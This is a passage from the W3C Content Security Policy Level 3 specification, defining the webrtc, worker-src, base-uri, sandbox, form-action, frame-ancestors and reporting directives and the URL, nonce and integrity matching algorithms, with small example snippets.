 execute](#should-directive-execute) on `name`,
 `style-src-attr` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.3.3 Does element match source list
 for type and source?](#match-element-to-source-list) on
 `element`, this directive's
 [value](#directive-value), `type`, and `source`, is
 \"`Does Not Match`\", return \"`Blocked`\".

4. Return \"`Allowed`\".

### 6.2. Other Directives

#### 6.2.1. `webrtc`

The [webrtc]
directive restricts whether connections may be established via WebRTC.
The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "webrtc"
 directive-value = "'allow'" / "'block'"

Given a page with the following
Content Security Policy:

 Content-Security-Policy: webrtc 'block'

No local ICE candidates will be surfaced, as no STUN checks will be made
against the ICE server provided to the peer connection negotiated below;
No connectivity-checks will be attempted to any remote candidates
provided by JS; The connectionState will never transition to
\"connected\" and instead transition directly from its initial state of
\"new\" to \"failed\" shortly. Attempts to pc.restartIce() will repeat
this outcome.

``` highlight
 <script>
 const iceServers = [{urls: "stun:stun.l.google.com:19302"}];
 const pc = new RTCPeerConnection({iceServers});
 pc.createDataChannel("");
 const io = new WebSocket('ws://example.com:8080');
 pc.onicecandidate = ({candidate}) => io.send({candidate});
 pc.onnegotiationneeded = async () => {
 await pc.setLocalDescription();
 io.send({description: pc.localDescription});
 };
 io.onmessage = async ({data: {description, candidate}}) => {
 if (description) {
 await pc.setRemoteDescription(description);
 if (description.type == "offer") {
 await pc.setLocalDescription();
 io.send({description: pc.localDescription});
 }
 } else if (candidate) await pc.addIceCandidate(candidate);
 };
</script>
```

##### 6.2.1.1. `webrtc` Pre-connect Check

This directive's [webrtc pre-connect
check](#directive-webrtc-pre-connect-check) is as follows:

1. If this directive's
 [value](#directive-value) contains a single item which is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the string
 \"[`'allow'`](#grammardef-allow)\", return \"`Allowed`\".

2. Return \"`Blocked`\".

#### 6.2.2. `worker-src`

The [worker-src]
directive restricts the URLs which may be loaded as a
[`Worker`](https://html.spec.whatwg.org/multipage/workers.html#worker),
[`SharedWorker`](https://html.spec.whatwg.org/multipage/workers.html#sharedworker), or
[`ServiceWorker`](https://www.w3.org/TR/service-workers/#serviceworker). The syntax for the directive's name and value is
described by the following ABNF:

 directive-name = "worker-src"
 directive-value = serialized-source-list

Given a page with the following
Content Security Policy:

 Content-Security-Policy: worker-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `worker-src`'s [source
list](#source-lists):

``` highlight
<script>
 var blockedWorker = new Worker("data:application/javascript,...");
 blockedWorker = new SharedWorker("https://example.org/");
 navigator.serviceWorker.register('https://example.org/sw.js');
</script>
```

##### 6.2.2.1. `worker-src` Pre-request Check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `worker-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.2.2.2. `worker-src` Post-request Check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `worker-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

### 6.3. Document Directives

The following directives govern the properties of a document or worker
environment to which a policy applies.

#### 6.3.1. `base-uri`

The [base-uri]
directive restricts the
[`URL`](https://url.spec.whatwg.org/#url)s which can be used in a
[`Document`](https://dom.spec.whatwg.org/#document)'s
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element) element. The syntax for the directive's name and
value is described by the following ABNF:

 directive-name = "base-uri"
 directive-value = serialized-source-list

The following algorithm is called during HTML's [set the frozen base
url](https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url) algorithm in order to monitor and enforce this
directive:

##### 6.3.1.1. Is `base` allowed for `document`?

Given a [`URL`](https://url.spec.whatwg.org/#url) `base`, and a
[`Document`](https://dom.spec.whatwg.org/#document) `document`, this algorithm returns
\"`Allowed`\" if `base` may be used as the value of a
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element) element's
[`href`](https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href) attribute, and \"`Blocked`\" otherwise:

1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `policy` of `document`'s
 [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object)'s [csp
 list](#global-object-csp-list):

 1. Let `source list` be null.

 2. If a [directive](#directives) whose
 [name](#directive-name) is \"`base-uri`\" is present in
 `policy`'s [directive
 set](#policy-directive-set), set `source list` to that
 [directive](#directives)'s
 [value](#directive-value).

 3. If `source list` is null, skip to the next
 `policy`.

 4. If the result of executing [§ 6.7.2.7 Does url match source list
 in origin with redirect count?](#match-url-to-source-list) on
 `base`, `source list`,
 `policy`'s
 [self-origin](#policy-self-origin), and `0` is \"`Does Not Match`\":

 1. Let `violation` be the result of executing
 [§ 2.4.1 Create a violation object for global, policy, and
 directive](#create-violation-for-global) on
 `document`'s [global
 object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object), `policy`, and
 \"[`base-uri`](#base-uri)\".

 2. Set `violation`'s
 [resource](#violation-resource) to \"`inline`\".

 3. Execute [§ 5.5 Report a violation](#report-violation) on
 `violation`.

 4. If `policy`'s
 [disposition](#policy-disposition) is \"`enforce`\", return \"`Blocked`\".

 We compare against the fallback base URL in order
 to deal correctly with things like [an iframe `srcdoc`
 `Document`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document) which has been sandboxed into an opaque origin.

2. Return \"`Allowed`\".

#### 6.3.2. `sandbox`

The [sandbox]
directive specifies an HTML sandbox policy which the user agent will
apply to a resource, just as though it had been included in an
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element) with a
[`sandbox`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) property.

The directive's syntax is described by the following ABNF grammar, with
the additional requirement that each token value MUST be one of the
keywords defined by HTML specification as allowed values for the
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)
[`sandbox`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) attribute
[\[HTML\]](#biblio-html "HTML Standard").

 directive-name = "sandbox"
 directive-value = "" / token *( required-ascii-whitespace token )

This directive has no reporting requirements; it will be ignored
entirely when delivered in a
[`Content-Security-Policy-Report-Only`](#header-content-security-policy-report-only) header, or within a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element.

##### 6.3.2.1. `sandbox` Initialization

This directive's
[initialization](#directive-initialization) algorithm is responsible for checking whether a worker
is allowed to run according to the
[`sandbox`](#sandbox) values present
in its policies as follows:

 The [sandbox](#sandbox) directive is also responsible for adjusting a
[`Document`](https://dom.spec.whatwg.org/#document)'s [active sandboxing flag
set](https://html.spec.whatwg.org/multipage/browsers.html#active-sandboxing-flag-set) via the [CSP-derived sandboxing
flags](https://html.spec.whatwg.org/multipage/browsers.html#csp-derived-sandboxing-flags).

Given a
[`Document`](https://dom.spec.whatwg.org/#document) or [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object) `context` and a
[policy](#content-security-policy-object) `policy`:

1. If `policy`'s
 [disposition](#policy-disposition) is not \"`enforce`\", or `context` is
 not a
 [`WorkerGlobalScope`](https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope), then abort this algorithm.

2. Let `sandboxing flag set` be a new [sandboxing flag
 set](https://html.spec.whatwg.org/multipage/browsers.html#sandboxing-flag-set).

3. [Parse a sandboxing
 directive](https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive) using this directive's
 [value](#directive-value) as the input, and `sandboxing flag set`
 as the output.

4. If `sandboxing flag set` contains either the [sandboxed
 scripts browsing context
 flag](https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag) or the [sandboxed origin browsing context
 flag](https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag) flags, return \"`Blocked`\".

 This will need to change if we allow Workers to be
 sandboxed into unique origins, which seems like a pretty reasonable
 thing to do.

5. Return \"`Allowed`\".

### 6.4. Navigation Directives

#### 6.4.1. `form-action`

The [form-action] directive restricts the
[`URL`](https://url.spec.whatwg.org/#url)s which can be used as the target of a form submissions
from a given context. The directive's syntax is described by the
following ABNF grammar:

``` abnf
directive-name = "form-action"
directive-value = serialized-source-list
```

##### 6.4.1.1. `form-action` Pre-Navigation Check

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a string
`navigation type` (\"`form-submission`\" or \"`other`\"), and
a
[policy](#content-security-policy-object) `policy` this algorithm returns
\"`Blocked`\" if a form submission violates the `form-action`
directive's constraints, and \"`Allowed`\" otherwise. This constitutes
the `form-action` directive's [pre-navigation
check](#directive-pre-navigation-check):

1. Assert: `policy` is unused in this algorithm.

2. If `navigation type` is \"`form-submission`\":

 1. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`,
 this directive's
 [value](#directive-value), and a `policy`, is
 \"`Does Not Match`\", return \"`Blocked`\".

3. Return \"`Allowed`\".

#### 6.4.2. `frame-ancestors`

The [frame-ancestors] directive restricts the
[`URL`](https://url.spec.whatwg.org/#url)s which can embed the resource using
[`frame`](https://html.spec.whatwg.org/multipage/obsolete.html#frame),
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element),
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element), or
[`embed`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element). Resources can use this directive to avoid many UI
Redressing
[\[UISECURITY\]](#biblio-uisecurity "User Interface Security and the Visibility API")
attacks, by avoiding the risk of being embedded into potentially hostile
contexts.

The directive's syntax is described by the following ABNF grammar:

 directive-name = "frame-ancestors"
 directive-value = ancestor-source-list

 ancestor-source-list = ( ancestor-source *( required-ascii-whitespace ancestor-source) ) / "'none'"
 ancestor-source = scheme-source / host-source / "'self'"

The `frame-ancestors` directive MUST be ignored when contained in a
policy declared via a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta) element.

 The `frame-ancestors` directive's syntax is similar to
a [source list](#source-lists),
but `frame-ancestors` will not fall back to the `default-src`
directive's value if one is specified. That is, a policy that declares
`default-src 'none'` will still allow the resource to be embedded by
anyone.

##### 6.4.2.1. `frame-ancestors` Navigation Response Check

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a string
`navigation type` (\"`form-submission`\" or \"`other`\"), a
[response](https://fetch.spec.whatwg.org/#concept-response) `navigation response`, a
[navigable](https://html.spec.whatwg.org/#navigable) `target`, a string `check type`
(\"`source`\" or \"`response`\"), and a
[policy](#content-security-policy-object) `policy` this algorithm returns
\"`Blocked`\" if one or more of the ancestors of `target`
violate the `frame-ancestors` directive delivered with the response, and
\"`Allowed`\" otherwise. This constitutes the `frame-ancestors`
directive's [navigation response
check](#directive-navigation-response-check):

1. If `navigation response`'s
 [URL](https://fetch.spec.whatwg.org/#concept-response-url) [is
 local](https://fetch.spec.whatwg.org/#is-local), return \"`Allowed`\".

2. Assert: `request`, `navigation response`, and
 `navigation type`, are unused from this point forward in
 this algorithm, as `frame-ancestors` is concerned only with
 `navigation response`'s
 [frame-ancestors](#frame-ancestors) [directive](#directives).

3. If `check type` is \"`source`\", return \"`Allowed`\".

 The \'frame-ancestors\'
 [directive](#directives) is
 relevant only to the `target`
 [navigable](https://html.spec.whatwg.org/#navigable) and it has no impact on the `request`'s
 context.

4. If `target` is not a [child
 navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable), return \"`Allowed`\".

5. Let `current` be `target`.

6. While `current` is a [child
 navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable):

 1. Let `document` be `current`'s [container
 document](https://html.spec.whatwg.org/multipage/document-sequences.html#nav-container-document).

 2. Let `origin` be the result of executing the [URL
 parser](https://url.spec.whatwg.org/#concept-url-parser) on the [ASCII
 serialization](https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin) of `document`'s
 [origin](https://dom.spec.whatwg.org/#concept-document-origin).

 3. If [§ 6.7.2.7 Does url match source list in origin with redirect
 count?](#match-url-to-source-list) returns `Does Not Match` when
 executed upon `origin`, this directive's
 [value](#directive-value), `policy`'s
 [self-origin](#policy-self-origin), and `0`, return \"`Blocked`\".

 4. Set `current` to `document`'s [node
 navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#node-navigable).

7. Return \"`Allowed`\".

##### [6.4.2.2. ][ Relation to \``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options)`` ` ``\` ]
This directive is similar to the
\``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options)`` ` ``\` HTTP response header. The `'none'`
source expression is roughly equivalent to that header's \``DENY`\`, and
`'self'` to that header's \``SAMEORIGIN`\`.
[\[HTML\]](#biblio-html "HTML Standard")

In order to allow backwards-compatible deployment, the
[`frame-ancestors`](#frame-ancestors) directive *overrides* the
\``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options)`` ` ``\` header. If a resource is delivered
with a
[policy](#content-security-policy-object) that includes a
[directive](#directives) named
[`frame-ancestors`](#frame-ancestors) and whose
[disposition](#policy-disposition) is \"`enforce`\", then the
\``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options)`` ` ``\` header will be ignored, per HTML's
processing model.

### 6.5. Reporting Directives

Various algorithms in this document hook into the reporting process by
constructing a [violation](#violation) object via [§ 2.4.2 Create a violation object for
request, and policy.](#create-violation-for-request) or [§ 2.4.1 Create
a violation object for global, policy, and
directive](#create-violation-for-global), and passing that object to
[§ 5.5 Report a violation](#report-violation) to deliver the report.

#### 6.5.1. `report-uri`

Note: The [`report-uri`](#report-uri) directive is deprecated. Please use the
[`report-to`](#report-to) directive
instead. If the latter directive is present, this directive will be
ignored. To ensure backwards compatibility, we suggest specifying both,
like this:

Content-Security-Policy: ...; report-uri https://endpoint.com; report-to groupname

The [`report-uri`] directive defines a set of endpoints to which [csp violation
reports](#csp-violation-report) will be sent when particular behaviors are prevented.

 directive-name = "report-uri"
 directive-value = uri-reference *( required-ascii-whitespace uri-reference )

 ; The uri-reference grammar is defined in Section 4.1 of RFC 3986.

The directive has no effect in and of itself, but only gains meaning in
combination with other directives.

#### 6.5.2. `report-to`

The [`report-to`]
directive defines a [reporting
endpoint](https://www.w3.org/TR/reporting-1/#endpoint) to which violation reports ought to be sent
[\[REPORTING\]](#biblio-reporting "Reporting API").
The directive's behavior is defined in [§ 5.5 Report a
violation](#report-violation). The directive's name and value are
described by the following ABNF:

 directive-name = "report-to"
 directive-value = token

### 6.6. Directives Defined in Other Documents

This document defines a core set of directives, and sets up a framework
for modular extension by other specifications. At the time this document
was produced, the following stable documents extend CSP:

- [\[MIX\]](#biblio-mix "Mixed Content") defines
 `block-all-mixed-content`

- [\[UPGRADE-INSECURE-REQUESTS\]](#biblio-upgrade-insecure-requests "Upgrade Insecure Requests")
 defines `upgrade-insecure-requests`

Extensions to CSP MUST register themselves via the process outlined in
[\[RFC7762\]](#biblio-rfc7762 "Initial Assignment for the Content Security Policy Directives Registry").
In particular, note the criteria discussed in Section 4.2 of that
document.

New directives SHOULD use the [pre-request
check](#directive-pre-request-check), [post-request
check](#directive-post-request-check), and
[initialization](#directive-initialization) hooks in order to integrate themselves into Fetch and
HTML.

### 6.7. Matching Algorithms

#### 6.7.1. Script directive checks

##### 6.7.1.1. Script directives pre-request check

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[directive](#directives)
`directive`, and a
[policy](#content-security-policy-object) `policy`:

1. If `request`'s
 [destination](https://fetch.spec.whatwg.org/#concept-request-destination) is
 [script-like](https://fetch.spec.whatwg.org/#request-destination-script-like):

 1. If the result of executing [§ 6.7.2.3 Does nonce match source
 list?](#match-nonce-to-source-list) on `request`'s
 [cryptographic nonce
 metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

 2. If the result of executing [§ 6.7.2.4 Does integrity metadata
 match source list?](#match-integrity-metadata-to-source-list) on
 `request`'s [integrity
 metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

 3. If `directive`'s
 [value](#directive-value) contains a [source
 expression](#source-expression) that is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the
 \"[`'strict-dynamic'`](#grammardef-strict-dynamic)\"
 [keyword-source](#grammardef-keyword-source):

 1. If the `request`'s [parser
 metadata](https://fetch.spec.whatwg.org/#concept-request-parser-metadata) is
 [\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted), return \"`Blocked`\".

 Otherwise, return \"`Allowed`\".

 \"[`'strict-dynamic'`](#grammardef-strict-dynamic)\" is explained in more detail in [§ 8.2
 Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage).

 4. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`,
 `directive`'s
 [value](#directive-value), and `policy`, is
 \"`Does Not Match`\", return \"`Blocked`\".

2. Return \"`Allowed`\".

##### 6.7.1.2. Script directives post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, a
[directive](#directives)
`directive`, and a
[policy](#content-security-policy-object) `policy`:

 This check needs both `request` and
`response` as input parameters since if
`request`'s [cryptographic nonce
metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) or [integrity
metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata) matches, then the script is allowed to load and the
check of whether `response`'s url matches the source list is
skipped.

1. If `request`'s
 [destination](https://fetch.spec.whatwg.org/#concept-request-destination) is
 [script-like](https://fetch.spec.whatwg.org/#request-destination-script-like):

 1. Call [potentially report
 hash](#potentially-report-hash) with `response`,
 `request`, `directive` and
 `policy`.

 2. If the result of executing [§ 6.7.2.3 Does nonce match source
 list?](#match-nonce-to-source-list) on `request`'s
 [cryptographic nonce
 metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

 3. If the result of executing [§ 6.7.2.4 Does integrity metadata
 match source list?](#match-integrity-metadata-to-source-list) on
 `request`'s [integrity
 metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

 4. If `directive`'s
 [value](#directive-value) contains a [source
 expression](#source-expression) that is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the
 \"[`'strict-dynamic'`](#grammardef-strict-dynamic)\"
 [keyword-source](#grammardef-keyword-source):

 1. If the `request`'s [parser
 metadata](https://fetch.spec.whatwg.org/#concept-request-parser-metadata) is
 [\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted), return \"`Blocked`\".

 Otherwise, return \"`Allowed`\".

 \"[`'strict-dynamic'`](#grammardef-strict-dynamic)\" is explained in more detail in [§ 8.2
 Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage).

 5. If the result of executing [§ 6.7.2.6 Does response to request
 match source list?](#match-response-to-source-list) on
 `response`, `request`,
 `directive`'s
 [value](#directive-value), and `policy`, is
 \"`Does Not Match`\", return \"`Blocked`\".

2. Return \"`Allowed`\".

#### 6.7.2. URL Matching

##### 6.7.2.1. Does `request` violate `policy`?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`, this algorithm returns the
violated [directive](#directives)
if the request violates the policy, and \"`Does Not Violate`\"
otherwise.

1. If `request`'s
 [initiator](https://fetch.spec.whatwg.org/#concept-request-initiator) is \"`prefetch`\", then return the result of
 executing [§ 6.7.2.2 Does resource hint request violate
 policy?](#does-resource-hint-violate-policy) on `request`
 and `policy`.

2. Let `violates` be \"`Does Not Violate`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. Let `result` be the result of executing
 `directive`'s [pre-request
 check](#directive-pre-request-check) on `request` and
 `policy`.

 2. If `result` is \"`Blocked`\", then let
 `violates` be `directive`.

4. Return `violates`.

##### 6.7.2.2. Does resource hint `request` violate `policy`?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`, this algorithm returns the default
[directive](#directives) if the
resource-hint request violates all the policies, and
\"`Does Not Violate`\" otherwise.

1. Let `defaultDirective` be `policy`'s first
 [directive](#directives)
 whose [name](#directive-name) is \"`default-src`\".

2. If `defaultDirective` does not exist, return
 \"`Does Not Violate`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `directive` of `policy`:

 1. If `directive`'s
 [name](#directive-name) is not one of the following:

 - `child-src`

 - `connect-src`

 - `font-src`

 - `frame-src`

 - `img-src`

 - `manifest-src`

 - `media-src`

 - `object-src`

 - `script-src`

 - `script-src-elem`

 - `style-src`

 - `style-src-elem`

 - `worker-src`

 then continue.

 2. Assert: `directive`'s
 [value](#directive-value) is a [source
 list](#source-lists).

 3. Let `result` be the result of executing [§ 6.7.2.5
 Does request match source list?](#match-request-to-source-list)
 on `request`, `directive`'s
 [value](#directive-value), and `policy`.

 4. If `result` is \"`Allowed`\", then return
 \"`Does Not Violate`\".

4. Return `defaultDirective`.

##### 6.7.2.3. Does `nonce` match `source list`?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request)'s [cryptographic nonce
metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) `nonce` and a [source
list](#source-lists)
`source list`, this algorithm returns \"`Matches`\" if the
nonce matches one or more source expressions in the list, and
\"`Does Not Match`\" otherwise:

1. Assert: `source list` is not null.

2. If `nonce` is the empty string, return
 \"`Does Not Match`\".

3. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `expression` of
 `source list`:

 1. If `expression` matches the
 [`nonce-source`](#grammardef-nonce-source) grammar, and `nonce` is
 [identical
 to](https://infra.spec.whatwg.org/#string-is) `expression`'s
 [`base64-value`](#grammardef-base64-value) part, return \"`Matches`\".

4. Return \"`Does Not Match`\".

##### 6.7.2.4. Does `integrity metadata` match `source list`?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request)'s [integrity
metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata) `integrity metadata` and a [source
list](#source-lists)
`source list`, this algorithm returns \"`Matches`\" if the
integrity metadata matches one or more source expressions in the list,
and \"`Does Not Match`\" otherwise:

1. Assert: `source list` is not null.

2. Let `integrity expressions` be the set of [source
 expressions](#source-expression) in `source list` that match the
 [hash-source](#grammardef-hash-source) grammar.

3. If `integrity expressions` is empty, return
 \"`Does Not Match`\".

4. Let `integrity sources` be the result of [parsing
 metadata](https://www.w3.org/TR/sri-2/#parse-metadata) given `integrity metadata`.
 [\[SRI\]](#biblio-sri "Subresource Integrity")

5. If `integrity sources` is \"`no metadata`\" or an empty
 set, return \"`Does Not Match`\".

6. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `source` of
 `integrity sources`:

 1. If `integrity expressions` does not contain a [source
 expression](#source-expression) whose
 [hash-algorithm](#grammardef-hash-algorithm) is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for `source`'s
 [hash-algorithm](#grammardef-hash-algorithm), and whose
 [base64-value](#grammardef-base64-value) is [identical
 to](https://infra.spec.whatwg.org/#string-is) `source`'s `base64-value`, return
 \"`Does Not Match`\".

7. Return \"`Matches`\".

 Here, we verify only whether the
`integrity metadata` is a non-empty subset of the
[hash-source](#grammardef-hash-source) sources in `source list`. We rely on the
browser's enforcement of Subresource Integrity
[\[SRI\]](#biblio-sri "Subresource Integrity") to
block non-matching resources upon response.

##### 6.7.2.5. Does `request` match `source list`?

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a [source
list](#source-lists)
`source list`, and a
[policy](#content-security-policy-object) `policy`, this algorithm returns the result
of executing [§ 6.7.2.7 Does url match source list in origin with
redirect count?](#match-url-to-source-list) on `request`'s
[current
url](https://fetch.spec.whatwg.org/#concept-request-current-url), `source list`, `policy`'s
[self-origin](#policy-self-origin), and `request`'s [redirect
count](https://fetch.spec.whatwg.org/#concept-request-redirect-count).

 This is generally used in
[directives](#directives)\'
[pre-request
check](#directive-pre-request-check) algorithms to verify that a given
[request](https://fetch.spec.whatwg.org/#concept-request) is reasonable.

##### 6.7.2.6. Does `response` to `request` match `source list`?

Given a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a [source
list](#source-lists)
`source list`, and a
[policy](#content-security-policy-object) `policy`, this algorithm returns the result
of executing [§ 6.7.2.7 Does url match source list in origin with
redirect count?](#match-url-to-source-list) on `response`'s
[url](https://fetch.spec.whatwg.org/#concept-response-url), `source list`, `policy`'s
[self-origin](#policy-self-origin), and `request`'s [redirect
count](https://fetch.spec.whatwg.org/#concept-request-redirect-count).

 This is generally used in
[directives](#directives)\'
[post-request
check](#directive-post-request-check) algorithms to verify that a given
[response](https://fetch.spec.whatwg.org/#concept-response) is reasonable.

##### 6.7.2.7. Does `url` match `source list` in `origin` with `redirect count`?

Given a [`URL`](https://url.spec.whatwg.org/#url) `url`, a [source
list](#source-lists)
`source list`, an
[origin](https://html.spec.whatwg.org/#concept-origin) `origin`, and a number
`redirect count`, this algorithm returns \"`Matches`\" if the
URL matches one or more source expressions in `source list`,
or \"`Does Not Match`\" otherwise:

1. Assert: `source list` is not null.

2. If `source list` [is
 empty](https://infra.spec.whatwg.org/#list-is-empty), return \"`Does Not Match`\".

3. If `source list`'s
 [size](https://infra.spec.whatwg.org/#list-size) is 1, and `source list`\[0\] is an
 [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the string \"`'none'`\", return
 \"`Does Not Match`\".

 An empty source list (that is, a directive without
 a value: `script-src`, as opposed to `script-src host1`) is
 equivalent to a source list containing `'none'`, and will not match
 any URL.

 The `'none'` keyword has no effect when other
 source expressions are present. That is, the list « `'none'` » does
 not match any URL. A list consisting of « `'none'`,
 `https://example.com` », on the other hand, would match
 `https://example.com/`.

4. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `expression` of
 `source list`:

 1. If [§ 6.7.2.8 Does url match expression in origin with redirect
 count?](#match-url-to-source-expression)
 returns \"`Matches`\" when executed upon `url`,
 `expression`, `origin`, and
 `redirect count`, return \"`Matches`\".

5. Return \"`Does Not Match`\".

##### 6.7.2.8. Does `url` match `expression` in `origin` with `redirect count`?

Given a [`URL`](https://url.spec.whatwg.org/#url) `url`, a [source
expression](#source-expression) `expression`, an
[origin](https://html.spec.whatwg.org/#concept-origin) `origin`, and a number
`redirect count`, this algorithm returns \"`Matches`\" if
`url` matches `expression`, and
\"`Does Not Match`\" otherwise.

 `origin` is the
[origin](https://html.spec.whatwg.org/#concept-origin) of the resource relative to which the
`expression` should be resolved. \"`'self'`\", for instance,
will have distinct meaning depending on that bit of context.

1. If `expression` is the string \"\*\", return
 \"`Matches`\" if one or more of the following conditions is met:

 1. `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is an [HTTP(S)
 scheme](https://fetch.spec.whatwg.org/#http-scheme).

 2. `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is the same as `origin`'s
 [scheme](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme).

 This logic means that in order to allow a resource
 from a non-[HTTP(S)
 scheme](https://fetch.spec.whatwg.org/#http-scheme), it has to be either explicitly specified (e.g.
 `default-src * data: custom-scheme-1: custom-scheme-2:`), or the
 protected resource must be loaded from the same scheme.

2. If `expression` matches the
 [`scheme-source`](#grammardef-scheme-source) or
 [`host-source`](#grammardef-host-source) grammar:

 1. If `expression` has a
 [`scheme-part`](#grammardef-scheme-part), and it does not [`scheme-part`
 match](#scheme-part-match) `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme), return \"`Does Not Match`\".

 2. If `expression` matches the
 [`scheme-source`](#grammardef-scheme-source) grammar, return \"`Matches`\".

3. If `expression` matches the
 [`host-source`](#grammardef-host-source) grammar:

 1. If `url`'s
 [`host`](https://url.spec.whatwg.org/#dom-url-host) is null, return \"`Does Not Match`\".

 2. If `expression` does not have a
 [`scheme-part`](#grammardef-scheme-part), and `origin`'s
